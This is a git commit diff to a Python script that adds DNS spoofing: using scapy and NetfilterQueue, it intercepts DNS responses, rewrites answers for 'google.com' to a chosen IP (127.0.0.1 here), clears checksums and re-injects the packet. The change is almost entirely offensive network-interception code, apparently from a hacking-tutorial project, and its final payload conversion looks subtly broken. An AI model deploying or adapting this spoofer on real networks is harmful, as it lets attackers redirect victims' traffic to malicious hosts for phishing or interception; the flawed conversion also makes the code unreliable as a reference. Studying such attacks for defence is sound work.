e16f5b626414993f2d6ee6c1239f9276165d12fc
Kedar Parikh <kedarparikh2016@gmail.com>
2026-02-01 11:58:48 +0530

    Modifying DNS Requests to point to Spoofed IP

--- main.py
+++ main.py
@@ -4,7 +4,22 @@ import scapy.all as scapy
 def processpacket(packet):
     spacket = scapy.IP(packet.get_payload())
     if spacket.haslayer(scapy.DNSRR):
-        print(spacket.show())
+        queryname = spacket[scapy.DNSQR].qname
+        targetdomain = "google.com"
+        spoofedip = "127.0.0.1"
+        if bytes(targetdomain.encode()) in queryname:
+            print("[+] Spoofing Target")
+            dnsreply = scapy.DNSRR(rrname=queryname, rdata=spoofedip)
+            spacket[scapy.DNS].an = dnsreply
+            spacket[scapy.DNS].ancount = 1
+
+            del spacket[scapy.IP].len
+            del spacket[scapy.IP].chksum
+            del spacket[scapy.UDP].len
+            del spacket[scapy.UDP].chksum
+            
+            packet.set_payload(bytes(str(spacket).encode()))
+
     packet.accept()
 try:
     queue = nfq.NetfilterQueue()
